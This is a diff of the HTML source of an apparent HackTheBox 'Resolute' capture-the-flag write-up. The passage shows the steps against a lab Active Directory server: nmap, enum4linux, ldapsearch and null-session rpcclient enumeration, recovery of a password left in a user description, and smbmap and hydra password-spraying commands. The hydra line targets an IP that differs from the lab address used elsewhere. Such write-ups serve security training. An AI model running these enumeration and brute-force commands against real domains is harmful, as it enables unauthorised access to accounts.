@@ -57,57 +57,57 @@
 <h1 id="hackthebox---resolute-writeup">Hackthebox - Resolute Writeup</h1>
 <p><img src="/img/htb_resolute/card.png" /></p>
 <h1 id="nmap-scan">Nmap Scan</h1>
-<div class="sourceCode" id="cb1"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb1-1"><a href="#cb1-1" aria-hidden="true"></a><span class="bu">export</span> <span class="va">ip=</span>10.10.10.169</span></code></pre></div>
-<div class="sourceCode" id="cb2"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb2-1"><a href="#cb2-1" aria-hidden="true"></a><span class="fu">nmap</span> -sC -sV -sS -oN nmap.put <span class="va">$ip</span></span></code></pre></div>
+<div class="sourceCode" id="cb1"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb1-1"><a href="#cb1-1" aria-hidden="true" tabindex="-1"></a><span class="bu">export</span> <span class="va">ip=</span>10.10.10.169</span></code></pre></div>
+<div class="sourceCode" id="cb2"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb2-1"><a href="#cb2-1" aria-hidden="true" tabindex="-1"></a><span class="fu">nmap</span> <span class="at">-sC</span> <span class="at">-sV</span> <span class="at">-sS</span> <span class="at">-oN</span> nmap.put <span class="va">$ip</span></span></code></pre></div>
 <p>open ports: * 53/tcp open domain? * 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2020-05-29 05:32:58Z) * 135/tcp open msrpc Microsoft Windows RPC * 139/tcp open netbios-ssn Microsoft Windows netbios-ssn * 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: megabank.local, Site: Default-First-Site-Name) * 445/tcp open microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: MEGABANK) * 464/tcp open kpasswd5? * 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 * 636/tcp open tcpwrapped * 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: megabank.local)</p>
 <p><img src="/img/htb_resolute/1.png" /></p>
 <p>We see that the server is running windows and has active directory. From the nmap scripts we fine the domain name and forest name as <strong>“megabank.local”</strong>. So we add a host to our /etc/hosts file</p>
-<div class="sourceCode" id="cb3"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb3-1"><a href="#cb3-1" aria-hidden="true"></a><span class="bu">echo</span> <span class="st">&quot;10.10.10.169 megabank.local&quot;</span> <span class="op">&gt;&gt;</span> /etc/hosts</span></code></pre></div>
+<div class="sourceCode" id="cb3"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb3-1"><a href="#cb3-1" aria-hidden="true" tabindex="-1"></a><span class="bu">echo</span> <span class="st">&quot;10.10.10.169 megabank.local&quot;</span> <span class="op">&gt;&gt;</span> /etc/hosts</span></code></pre></div>
 <p>We also fine that the smb server running allows guest authentication.</p>
 <h1 id="enumeration">Enumeration</h1>
 <h2 id="active-directory---enum4linux">Active Directory - enum4linux</h2>
 <p>We enumerate using enum4linux</p>
-<div class="sourceCode" id="cb4"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb4-1"><a href="#cb4-1" aria-hidden="true"></a><span class="ex">enum4linux</span> -a <span class="va">$ip</span></span></code></pre></div>
+<div class="sourceCode" id="cb4"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb4-1"><a href="#cb4-1" aria-hidden="true" tabindex="-1"></a><span class="ex">enum4linux</span> <span class="at">-a</span> <span class="va">$ip</span></span></code></pre></div>
 <p>In the output, we find the following users and groups</p>
-<div class="sourceCode" id="cb5"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb5-1"><a href="#cb5-1" aria-hidden="true"></a><span class="ex">Group</span> <span class="st">&#39;Schema Admins&#39;</span> (RID: 518) <span class="ex">has</span> member: MEGABANK\Administrator</span>
-<span id="cb5-2"><a href="#cb5-2" aria-hidden="true"></a><span class="ex">Group</span> <span class="st">&#39;Group Policy Creator Owners&#39;</span> (RID: 520) <span class="ex">has</span> member: MEGABANK\Administrator</span>
-<span id="cb5-3"><a href="#cb5-3" aria-hidden="true"></a><span class="ex">Group</span> <span class="st">&#39;Domain Guests&#39;</span> (RID: 514) <span class="ex">has</span> member: MEGABANK\Guest</span>
-<span id="cb5-4"><a href="#cb5-4" aria-hidden="true"></a><span class="ex">Group</span> <span class="st">&#39;Domain Users&#39;</span> (RID: 513) <span class="ex">has</span> member: MEGABANK\Administrator</span>
-<span id="cb5-5"><a href="#cb5-5" aria-hidden="true"></a><span class="ex">Group</span> <span class="st">&#39;Domain Users&#39;</span> (RID: 513) <span class="ex">has</span> member: MEGABANK\DefaultAccount</span>
-<span id="cb5-6"><a href="#cb5-6" aria-hidden="true"></a><span class="ex">Group</span> <span class="st">&#39;Domain Users&#39;</span> (RID: 513) <span class="ex">has</span> member: MEGABANK\krbtgt</span>
-<span id="cb5-7"><a href="#cb5-7" aria-hidden="true"></a><span class="ex">Group</span> <span class="st">&#39;Domain Users&#39;</span> (RID: 513) <span class="ex">has</span> member: MEGABANK\ryan</span>
-<span id="cb5-8"><a href="#cb5-8" aria-hidden="true"></a><span class="ex">Group</span> <span class="st">&#39;Domain Users&#39;</span> (RID: 513) <span class="ex">has</span> member: MEGABANK\marko</span>
-<span id="cb5-9"><a href="#cb5-9" aria-hidden="true"></a><span class="ex">Group</span> <span class="st">&#39;Domain Users&#39;</span> (RID: 513) <span class="ex">has</span> member: MEGABANK\sunita</span>
-<span id="cb5-10"><a href="#cb5-10" aria-hidden="true"></a><span class="ex">Group</span> <span class="st">&#39;Domain Users&#39;</span> (RID: 513) <span class="ex">has</span> member: MEGABANK\abigail</span>
-<span id="cb5-11"><a href="#cb5-11" aria-hidden="true"></a><span class="ex">Group</span> <span class="st">&#39;Domain Users&#39;</span> (RID: 513) <span class="ex">has</span> member: MEGABANK\marcus</span>
-<span id="cb5-12"><a href="#cb5-12" aria-hidden="true"></a><span class="ex">Group</span> <span class="st">&#39;Domain Users&#39;</span> (RID: 513) <span class="ex">has</span> member: MEGABANK\sally</span>
-<span id="cb5-13"><a href="#cb5-13" aria-hidden="true"></a><span class="ex">Group</span> <span class="st">&#39;Domain Users&#39;</span> (RID: 513) <span class="ex">has</span> member: MEGABANK\fred</span>
-<span id="cb5-14"><a href="#cb5-14" aria-hidden="true"></a><span class="ex">Group</span> <span class="st">&#39;Domain Users&#39;</span> (RID: 513) <span class="ex">has</span> member: MEGABANK\angela</span>
-<span id="cb5-15"><a href="#cb5-15" aria-hidden="true"></a><span class="ex">Group</span> <span class="st">&#39;Domain Users&#39;</span> (RID: 513) <span class="ex">has</span> member: MEGABANK\felicia</span>
-<span id="cb5-16"><a href="#cb5-16" aria-hidden="true"></a><span class="ex">Group</span> <span class="st">&#39;Domain Users&#39;</span> (RID: 513) <span class="ex">has</span> member: MEGABANK\gustavo</span>
-<span id="cb5-17"><a href="#cb5-17" aria-hidden="true"></a><span class="ex">Group</span> <span class="st">&#39;Domain Users&#39;</span> (RID: 513) <span class="ex">has</span> member: MEGABANK\ulf</span>
-<span id="cb5-18"><a href="#cb5-18" aria-hidden="true"></a><span class="ex">Group</span> <span class="st">&#39;Domain Users&#39;</span> (RID: 513) <span class="ex">has</span> member: MEGABANK\stevie</span>
-<span id="cb5-19"><a href="#cb5-19" aria-hidden="true"></a><span class="ex">Group</span> <span class="st">&#39;Domain Users&#39;</span> (RID: 513) <span class="ex">has</span> member: MEGABANK\claire</span>
-<span id="cb5-20"><a href="#cb5-20" aria-hidden="true"></a><span class="ex">Group</span> <span class="st">&#39;Domain Users&#39;</span> (RID: 513) <span class="ex">has</span> member: MEGABANK\paulo</span>
-<span id="cb5-21"><a href="#cb5-21" aria-hidden="true"></a><span class="ex">Group</span> <span class="st">&#39;Domain Users&#39;</span> (RID: 513) <span class="ex">has</span> member: MEGABANK\steve</span>
-<span id="cb5-22"><a href="#cb5-22" aria-hidden="true"></a><span class="ex">Group</span> <span class="st">&#39;Domain Users&#39;</span> (RID: 513) <span class="ex">has</span> member: MEGABANK\annette</span>
-<span id="cb5-23"><a href="#cb5-23" aria-hidden="true"></a><span class="ex">Group</span> <span class="st">&#39;Domain Users&#39;</span> (RID: 513) <span class="ex">has</span> member: MEGABANK\annika</span>
-<span id="cb5-24"><a href="#cb5-24" aria-hidden="true"></a><span class="ex">Group</span> <span class="st">&#39;Domain Users&#39;</span> (RID: 513) <span class="ex">has</span> member: MEGABANK\per</span>
-<span id="cb5-25"><a href="#cb5-25" aria-hidden="true"></a><span class="ex">Group</span> <span class="st">&#39;Domain Users&#39;</span> (RID: 513) <span class="ex">has</span> member: MEGABANK\claude</span>
-<span id="cb5-26"><a href="#cb5-26" aria-hidden="true"></a><span class="ex">Group</span> <span class="st">&#39;Domain Users&#39;</span> (RID: 513) <span class="ex">has</span> member: MEGABANK\melanie</span>
-<span id="cb5-27"><a href="#cb5-27" aria-hidden="true"></a><span class="ex">Group</span> <span class="st">&#39;Domain Users&#39;</span> (RID: 513) <span class="ex">has</span> member: MEGABANK\zach</span>
-<span id="cb5-28"><a href="#cb5-28" aria-hidden="true"></a><span class="ex">Group</span> <span class="st">&#39;Domain Users&#39;</span> (RID: 513) <span class="ex">has</span> member: MEGABANK\simon</span>
-<span id="cb5-29"><a href="#cb5-29" aria-hidden="true"></a><span class="ex">Group</span> <span class="st">&#39;Domain Users&#39;</span> (RID: 513) <span class="ex">has</span> member: MEGABANK\naoki</span>
-<span id="cb5-30"><a href="#cb5-30" aria-hidden="true"></a><span class="ex">Group</span> <span class="st">&#39;Domain Admins&#39;</span> (RID: 512) <span class="ex">has</span> member: MEGABANK\Administrator</span>
-<span id="cb5-31"><a href="#cb5-31" aria-hidden="true"></a><span class="ex">Group</span> <span class="st">&#39;Enterprise Admins&#39;</span> (RID: 519) <span class="ex">has</span> member: MEGABANK\Administrator</span>
-<span id="cb5-32"><a href="#cb5-32" aria-hidden="true"></a><span class="ex">Group</span> <span class="st">&#39;Domain Controllers&#39;</span> (RID: 516) <span class="ex">has</span> member: MEGABANK\RESOLUTE$</span>
-<span id="cb5-33"><a href="#cb5-33" aria-hidden="true"></a><span class="ex">Group</span> <span class="st">&#39;Domain Computers&#39;</span> (RID: 515) <span class="ex">has</span> member: MEGABANK\MS02$</span>
-<span id="cb5-34"><a href="#cb5-34" aria-hidden="true"></a><span class="ex">Group</span> <span class="st">&#39;Contractors&#39;</span> (RID: 1103) <span class="ex">has</span> member: MEGABANK\ryan</span></code></pre></div>
+<div class="sourceCode" id="cb5"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb5-1"><a href="#cb5-1" aria-hidden="true" tabindex="-1"></a><span class="ex">Group</span> <span class="st">&#39;Schema Admins&#39;</span> <span class="er">(</span><span class="ex">RID:</span> 518<span class="kw">)</span> <span class="ex">has</span> member: MEGABANK<span class="dt">\A</span>dministrator</span>
+<span id="cb5-2"><a href="#cb5-2" aria-hidden="true" tabindex="-1"></a><span class="ex">Group</span> <span class="st">&#39;Group Policy Creator Owners&#39;</span> <span class="er">(</span><span class="ex">RID:</span> 520<span class="kw">)</span> <span class="ex">has</span> member: MEGABANK<span class="dt">\A</span>dministrator</span>
+<span id="cb5-3"><a href="#cb5-3" aria-hidden="true" tabindex="-1"></a><span class="ex">Group</span> <span class="st">&#39;Domain Guests&#39;</span> <span class="er">(</span><span class="ex">RID:</span> 514<span class="kw">)</span> <span class="ex">has</span> member: MEGABANK<span class="dt">\G</span>uest</span>
+<span id="cb5-4"><a href="#cb5-4" aria-hidden="true" tabindex="-1"></a><span class="ex">Group</span> <span class="st">&#39;Domain Users&#39;</span> <span class="er">(</span><span class="ex">RID:</span> 513<span class="kw">)</span> <span class="ex">has</span> member: MEGABANK<span class="dt">\A</span>dministrator</span>
+<span id="cb5-5"><a href="#cb5-5" aria-hidden="true" tabindex="-1"></a><span class="ex">Group</span> <span class="st">&#39;Domain Users&#39;</span> <span class="er">(</span><span class="ex">RID:</span> 513<span class="kw">)</span> <span class="ex">has</span> member: MEGABANK<span class="dt">\D</span>efaultAccount</span>
+<span id="cb5-6"><a href="#cb5-6" aria-hidden="true" tabindex="-1"></a><span class="ex">Group</span> <span class="st">&#39;Domain Users&#39;</span> <span class="er">(</span><span class="ex">RID:</span> 513<span class="kw">)</span> <span class="ex">has</span> member: MEGABANK<span class="dt">\k</span>rbtgt</span>
+<span id="cb5-7"><a href="#cb5-7" aria-hidden="true" tabindex="-1"></a><span class="ex">Group</span> <span class="st">&#39;Domain Users&#39;</span> <span class="er">(</span><span class="ex">RID:</span> 513<span class="kw">)</span> <span class="ex">has</span> member: MEGABANK<span class="dt">\r</span>yan</span>
+<span id="cb5-8"><a href="#cb5-8" aria-hidden="true" tabindex="-1"></a><span class="ex">Group</span> <span class="st">&#39;Domain Users&#39;</span> <span class="er">(</span><span class="ex">RID:</span> 513<span class="kw">)</span> <span class="ex">has</span> member: MEGABANK<span class="dt">\m</span>arko</span>
+<span id="cb5-9"><a href="#cb5-9" aria-hidden="true" tabindex="-1"></a><span class="ex">Group</span> <span class="st">&#39;Domain Users&#39;</span> <span class="er">(</span><span class="ex">RID:</span> 513<span class="kw">)</span> <span class="ex">has</span> member: MEGABANK<span class="dt">\s</span>unita</span>
+<span id="cb5-10"><a href="#cb5-10" aria-hidden="true" tabindex="-1"></a><span class="ex">Group</span> <span class="st">&#39;Domain Users&#39;</span> <span class="er">(</span><span class="ex">RID:</span> 513<span class="kw">)</span> <span class="ex">has</span> member: MEGABANK<span class="dt">\a</span>bigail</span>
+<span id="cb5-11"><a href="#cb5-11" aria-hidden="true" tabindex="-1"></a><span class="ex">Group</span> <span class="st">&#39;Domain Users&#39;</span> <span class="er">(</span><span class="ex">RID:</span> 513<span class="kw">)</span> <span class="ex">has</span> member: MEGABANK<span class="dt">\m</span>arcus</span>
+<span id="cb5-12"><a href="#cb5-12" aria-hidden="true" tabindex="-1"></a><span class="ex">Group</span> <span class="st">&#39;Domain Users&#39;</span> <span class="er">(</span><span class="ex">RID:</span> 513<span class="kw">)</span> <span class="ex">has</span> member: MEGABANK<span class="dt">\s</span>ally</span>
+<span id="cb5-13"><a href="#cb5-13" aria-hidden="true" tabindex="-1"></a><span class="ex">Group</span> <span class="st">&#39;Domain Users&#39;</span> <span class="er">(</span><span class="ex">RID:</span> 513<span class="kw">)</span> <span class="ex">has</span> member: MEGABANK<span class="dt">\f</span>red</span>
+<span id="cb5-14"><a href="#cb5-14" aria-hidden="true" tabindex="-1"></a><span class="ex">Group</span> <span class="st">&#39;Domain Users&#39;</span> <span class="er">(</span><span class="ex">RID:</span> 513<span class="kw">)</span> <span class="ex">has</span> member: MEGABANK<span class="dt">\a</span>ngela</span>
+<span id="cb5-15"><a href="#cb5-15" aria-hidden="true" tabindex="-1"></a><span class="ex">Group</span> <span class="st">&#39;Domain Users&#39;</span> <span class="er">(</span><span class="ex">RID:</span> 513<span class="kw">)</span> <span class="ex">has</span> member: MEGABANK<span class="dt">\f</span>elicia</span>
+<span id="cb5-16"><a href="#cb5-16" aria-hidden="true" tabindex="-1"></a><span class="ex">Group</span> <span class="st">&#39;Domain Users&#39;</span> <span class="er">(</span><span class="ex">RID:</span> 513<span class="kw">)</span> <span class="ex">has</span> member: MEGABANK<span class="dt">\g</span>ustavo</span>
+<span id="cb5-17"><a href="#cb5-17" aria-hidden="true" tabindex="-1"></a><span class="ex">Group</span> <span class="st">&#39;Domain Users&#39;</span> <span class="er">(</span><span class="ex">RID:</span> 513<span class="kw">)</span> <span class="ex">has</span> member: MEGABANK<span class="dt">\u</span>lf</span>
+<span id="cb5-18"><a href="#cb5-18" aria-hidden="true" tabindex="-1"></a><span class="ex">Group</span> <span class="st">&#39;Domain Users&#39;</span> <span class="er">(</span><span class="ex">RID:</span> 513<span class="kw">)</span> <span class="ex">has</span> member: MEGABANK<span class="dt">\s</span>tevie</span>
+<span id="cb5-19"><a href="#cb5-19" aria-hidden="true" tabindex="-1"></a><span class="ex">Group</span> <span class="st">&#39;Domain Users&#39;</span> <span class="er">(</span><span class="ex">RID:</span> 513<span class="kw">)</span> <span class="ex">has</span> member: MEGABANK<span class="dt">\c</span>laire</span>
+<span id="cb5-20"><a href="#cb5-20" aria-hidden="true" tabindex="-1"></a><span class="ex">Group</span> <span class="st">&#39;Domain Users&#39;</span> <span class="er">(</span><span class="ex">RID:</span> 513<span class="kw">)</span> <span class="ex">has</span> member: MEGABANK<span class="dt">\p</span>aulo</span>
+<span id="cb5-21"><a href="#cb5-21" aria-hidden="true" tabindex="-1"></a><span class="ex">Group</span> <span class="st">&#39;Domain Users&#39;</span> <span class="er">(</span><span class="ex">RID:</span> 513<span class="kw">)</span> <span class="ex">has</span> member: MEGABANK<span class="dt">\s</span>teve</span>
+<span id="cb5-22"><a href="#cb5-22" aria-hidden="true" tabindex="-1"></a><span class="ex">Group</span> <span class="st">&#39;Domain Users&#39;</span> <span class="er">(</span><span class="ex">RID:</span> 513<span class="kw">)</span> <span class="ex">has</span> member: MEGABANK<span class="dt">\a</span>nnette</span>
+<span id="cb5-23"><a href="#cb5-23" aria-hidden="true" tabindex="-1"></a><span class="ex">Group</span> <span class="st">&#39;Domain Users&#39;</span> <span class="er">(</span><span class="ex">RID:</span> 513<span class="kw">)</span> <span class="ex">has</span> member: MEGABANK<span class="dt">\a</span>nnika</span>
+<span id="cb5-24"><a href="#cb5-24" aria-hidden="true" tabindex="-1"></a><span class="ex">Group</span> <span class="st">&#39;Domain Users&#39;</span> <span class="er">(</span><span class="ex">RID:</span> 513<span class="kw">)</span> <span class="ex">has</span> member: MEGABANK<span class="dt">\p</span>er</span>
+<span id="cb5-25"><a href="#cb5-25" aria-hidden="true" tabindex="-1"></a><span class="ex">Group</span> <span class="st">&#39;Domain Users&#39;</span> <span class="er">(</span><span class="ex">RID:</span> 513<span class="kw">)</span> <span class="ex">has</span> member: MEGABANK<span class="dt">\c</span>laude</span>
+<span id="cb5-26"><a href="#cb5-26" aria-hidden="true" tabindex="-1"></a><span class="ex">Group</span> <span class="st">&#39;Domain Users&#39;</span> <span class="er">(</span><span class="ex">RID:</span> 513<span class="kw">)</span> <span class="ex">has</span> member: MEGABANK<span class="dt">\m</span>elanie</span>
+<span id="cb5-27"><a href="#cb5-27" aria-hidden="true" tabindex="-1"></a><span class="ex">Group</span> <span class="st">&#39;Domain Users&#39;</span> <span class="er">(</span><span class="ex">RID:</span> 513<span class="kw">)</span> <span class="ex">has</span> member: MEGABANK<span class="dt">\z</span>ach</span>
+<span id="cb5-28"><a href="#cb5-28" aria-hidden="true" tabindex="-1"></a><span class="ex">Group</span> <span class="st">&#39;Domain Users&#39;</span> <span class="er">(</span><span class="ex">RID:</span> 513<span class="kw">)</span> <span class="ex">has</span> member: MEGABANK<span class="dt">\s</span>imon</span>
+<span id="cb5-29"><a href="#cb5-29" aria-hidden="true" tabindex="-1"></a><span class="ex">Group</span> <span class="st">&#39;Domain Users&#39;</span> <span class="er">(</span><span class="ex">RID:</span> 513<span class="kw">)</span> <span class="ex">has</span> member: MEGABANK<span class="dt">\n</span>aoki</span>
+<span id="cb5-30"><a href="#cb5-30" aria-hidden="true" tabindex="-1"></a><span class="ex">Group</span> <span class="st">&#39;Domain Admins&#39;</span> <span class="er">(</span><span class="ex">RID:</span> 512<span class="kw">)</span> <span class="ex">has</span> member: MEGABANK<span class="dt">\A</span>dministrator</span>
+<span id="cb5-31"><a href="#cb5-31" aria-hidden="true" tabindex="-1"></a><span class="ex">Group</span> <span class="st">&#39;Enterprise Admins&#39;</span> <span class="er">(</span><span class="ex">RID:</span> 519<span class="kw">)</span> <span class="ex">has</span> member: MEGABANK<span class="dt">\A</span>dministrator</span>
+<span id="cb5-32"><a href="#cb5-32" aria-hidden="true" tabindex="-1"></a><span class="ex">Group</span> <span class="st">&#39;Domain Controllers&#39;</span> <span class="er">(</span><span class="ex">RID:</span> 516<span class="kw">)</span> <span class="ex">has</span> member: MEGABANK<span class="dt">\R</span>ESOLUTE$</span>
+<span id="cb5-33"><a href="#cb5-33" aria-hidden="true" tabindex="-1"></a><span class="ex">Group</span> <span class="st">&#39;Domain Computers&#39;</span> <span class="er">(</span><span class="ex">RID:</span> 515<span class="kw">)</span> <span class="ex">has</span> member: MEGABANK<span class="dt">\M</span>S02$</span>
+<span id="cb5-34"><a href="#cb5-34" aria-hidden="true" tabindex="-1"></a><span class="ex">Group</span> <span class="st">&#39;Contractors&#39;</span> <span class="er">(</span><span class="ex">RID:</span> 1103<span class="kw">)</span> <span class="ex">has</span> member: MEGABANK<span class="dt">\r</span>yan</span></code></pre></div>
 <p>We also find the password policy if we need to bruteforce</p>
-<div class="sourceCode" id="cb6"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb6-1"><a href="#cb6-1" aria-hidden="true"></a>[<span class="ex">+</span>] Retieved partial password policy with rpcclient:</span>
-<span id="cb6-2"><a href="#cb6-2" aria-hidden="true"></a></span>
-<span id="cb6-3"><a href="#cb6-3" aria-hidden="true"></a><span class="ex">Password</span> Complexity: Disabled</span>
-<span id="cb6-4"><a href="#cb6-4" aria-hidden="true"></a><span class="ex">Minimum</span> Password Length: 7</span></code></pre></div>
+<div class="sourceCode" id="cb6"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb6-1"><a href="#cb6-1" aria-hidden="true" tabindex="-1"></a><span class="ex">[+]</span> Retieved partial password policy with rpcclient:</span>
+<span id="cb6-2"><a href="#cb6-2" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb6-3"><a href="#cb6-3" aria-hidden="true" tabindex="-1"></a><span class="ex">Password</span> Complexity: Disabled</span>
+<span id="cb6-4"><a href="#cb6-4" aria-hidden="true" tabindex="-1"></a><span class="ex">Minimum</span> Password Length: 7</span></code></pre></div>
 <p>Having a thorough look at the output of enum4linux, we get</p>
 <p><img src="/img/htb_resolute/2.png" /></p>
 <p>So a user marko has written a password in the description</p>
@@ -116,19 +116,19 @@
 </blockquote>
 <h2 id="active-directory---ldapsearch">Active directory - ldapsearch</h2>
 <p>We see that the server is running ldap. We can retrieve the info we found with enum4linux using ldapsearch as well. First we need the rootds. to get that, we can use the nmap script <strong>ldap-search</strong> or we can use ldapsearch as well.</p>
-<div class="sourceCode" id="cb7"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb7-1"><a href="#cb7-1" aria-hidden="true"></a><span class="fu">nmap</span> --script=ldap-search -Pn -p 389 10.10.10.169</span>
-<span id="cb7-2"><a href="#cb7-2" aria-hidden="true"></a><span class="ex">ldapsearch</span> -x -h 10.10.10.169 -s base namingcontexts  # Cleaner results</span></code></pre></div>
+<div class="sourceCode" id="cb7"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb7-1"><a href="#cb7-1" aria-hidden="true" tabindex="-1"></a><span class="fu">nmap</span> <span class="at">--script</span><span class="op">=</span>ldap-search <span class="at">-Pn</span> <span class="at">-p</span> 389 10.10.10.169</span>
+<span id="cb7-2"><a href="#cb7-2" aria-hidden="true" tabindex="-1"></a><span class="ex">ldapsearch</span> <span class="at">-x</span> <span class="at">-h</span> 10.10.10.169 <span class="at">-s</span> base namingcontexts  <span class="co"># Cleaner results</span></span></code></pre></div>
 <p>NOTE: -x for simple authentication -h for host -s for scope</p>
 <p><img src="/img/htb_resolute/11.png" /></p>
 <p>We get the root dn:</p>
 <blockquote>
 <p>DC=megabank,DC=local</p>
 </blockquote>
-<div class="sourceCode" id="cb8"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb8-1"><a href="#cb8-1" aria-hidden="true"></a><span class="ex">ldapsearch</span> -x -b <span class="st">&quot;dc=megabank, dc=local&quot;</span> -h 10.10.10.169 # all scopes</span>
-<span id="cb8-2"><a href="#cb8-2" aria-hidden="true"></a><span class="ex">ldapsearch</span> -x -b <span class="st">&quot;dc=megabank, dc=local&quot;</span> -h 10.10.10.169 -s base # base scope</span>
-<span id="cb8-3"><a href="#cb8-3" aria-hidden="true"></a><span class="ex">ldapsearch</span> -x -b <span class="st">&quot;dc=megabank, dc=local&quot;</span> -h 10.10.10.169 -s sub  # scope subtree</span>
-<span id="cb8-4"><a href="#cb8-4" aria-hidden="true"></a></span>
-<span id="cb8-5"><a href="#cb8-5" aria-hidden="true"></a><span class="ex">ldapsearch</span> -x -b <span class="st">&quot;cn=users, dc=megabank, dc=local&quot;</span> -h 10.10.10.169</span></code></pre></div>
+<div class="sourceCode" id="cb8"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb8-1"><a href="#cb8-1" aria-hidden="true" tabindex="-1"></a><span class="ex">ldapsearch</span> <span class="at">-x</span> <span class="at">-b</span> <span class="st">&quot;dc=megabank, dc=local&quot;</span> <span class="at">-h</span> 10.10.10.169 <span class="co"># all scopes</span></span>
+<span id="cb8-2"><a href="#cb8-2" aria-hidden="true" tabindex="-1"></a><span class="ex">ldapsearch</span> <span class="at">-x</span> <span class="at">-b</span> <span class="st">&quot;dc=megabank, dc=local&quot;</span> <span class="at">-h</span> 10.10.10.169 <span class="at">-s</span> base <span class="co"># base scope</span></span>
+<span id="cb8-3"><a href="#cb8-3" aria-hidden="true" tabindex="-1"></a><span class="ex">ldapsearch</span> <span class="at">-x</span> <span class="at">-b</span> <span class="st">&quot;dc=megabank, dc=local&quot;</span> <span class="at">-h</span> 10.10.10.169 <span class="at">-s</span> sub  <span class="co"># scope subtree</span></span>
+<span id="cb8-4"><a href="#cb8-4" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb8-5"><a href="#cb8-5" aria-hidden="true" tabindex="-1"></a><span class="ex">ldapsearch</span> <span class="at">-x</span> <span class="at">-b</span> <span class="st">&quot;cn=users, dc=megabank, dc=local&quot;</span> <span class="at">-h</span> 10.10.10.169</span></code></pre></div>
 <ul>
 <li>dn = distinguished name</li>
 <li>cn = common name</li>
@@ -139,21 +139,21 @@
 <p>Looking through the output, we can find the description of the user marko to get the password.</p>
 <h2 id="active-directory---rpcclient">Active directory - rpcclient</h2>
 <p>We can get the users and userinfo using rpcclient NULL authentication</p>
-<div class="sourceCode" id="cb9"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb9-1"><a href="#cb9-1" aria-hidden="true"></a><span class="ex">rpcclient</span> -U <span class="st">&#39;&#39;</span> -I 10.10.10.169 megabank.local</span></code></pre></div>
+<div class="sourceCode" id="cb9"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb9-1"><a href="#cb9-1" aria-hidden="true" tabindex="-1"></a><span class="ex">rpcclient</span> <span class="at">-U</span> <span class="st">&#39;&#39;</span> <span class="at">-I</span> 10.10.10.169 megabank.local</span></code></pre></div>
 <p>We can execute the following rpcclient commands</p>
-<div class="sourceCode" id="cb10"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb10-1"><a href="#cb10-1" aria-hidden="true"></a><span class="ex">rpcclient</span> $<span class="op">&gt;</span> enumdomusers  # Get a list of users with their rid</span></code></pre></div>
-<div class="sourceCode" id="cb11"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb11-1"><a href="#cb11-1" aria-hidden="true"></a><span class="ex">rpcclient</span> $<span class="op">&gt;</span> queryuser 0x457 # get userinfo with rid. user marko here</span></code></pre></div>
+<div class="sourceCode" id="cb10"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb10-1"><a href="#cb10-1" aria-hidden="true" tabindex="-1"></a><span class="ex">rpcclient</span> $<span class="op">&gt;</span> enumdomusers  <span class="co"># Get a list of users with their rid</span></span></code></pre></div>
+<div class="sourceCode" id="cb11"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb11-1"><a href="#cb11-1" aria-hidden="true" tabindex="-1"></a><span class="ex">rpcclient</span> $<span class="op">&gt;</span> queryuser 0x457 <span class="co"># get userinfo with rid. user marko here</span></span></code></pre></div>
 <p><img src="/img/htb_resolute/12.png" /></p>
 <p>We get the password.</p>
 <p>We can look at all the users’ basic info using</p>
-<div class="sourceCode" id="cb12"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb12-1"><a href="#cb12-1" aria-hidden="true"></a><span class="ex">rpclient</span> $<span class="op">&gt;</span> querydispinfo</span></code></pre></div>
+<div class="sourceCode" id="cb12"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb12-1"><a href="#cb12-1" aria-hidden="true" tabindex="-1"></a><span class="ex">rpclient</span> $<span class="op">&gt;</span> querydispinfo</span></code></pre></div>
 <h1 id="privilege-escalation---user-melanie">Privilege Escalation - User Melanie</h1>
 <h2 id="login-using-found-creds">Login using found creds</h2>
 <p>We try logging into the smb server using the found creds but get an authentication error</p>
-<div class="sourceCode" id="cb13"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb13-1"><a href="#cb13-1" aria-hidden="true"></a><span class="ex">smbmap</span> -u <span class="st">&quot;marko&quot;</span> -p <span class="st">&quot;Welcome123!&quot;</span> -H megabank.local</span></code></pre></div>
+<div class="sourceCode" id="cb13"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb13-1"><a href="#cb13-1" aria-hidden="true" tabindex="-1"></a><span class="ex">smbmap</span> <span class="at">-u</span> <span class="st">&quot;marko&quot;</span> <span class="at">-p</span> <span class="st">&quot;Welcome123!&quot;</span> <span class="at">-H</span> megabank.local</span></code></pre></div>
 <h2 id="hydra-user-bruteforce">Hydra user bruteforce</h2>
 <p>It seems that the password found is not for the user “marko”. We found many other users. We try bruteforcing the found passwords against the users. For this we create a file “user.txt” that contains the names of our users. Then we bruteforce the users using hydra</p>
-<div class="sourceCode" id="cb14"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb14-1"><a href="#cb14-1" aria-hidden="true"></a><span class="ex">hydra</span> -L usernames.txt -P passwords.txt 192.168.2.66 smb -V -f</span></code></pre></div>
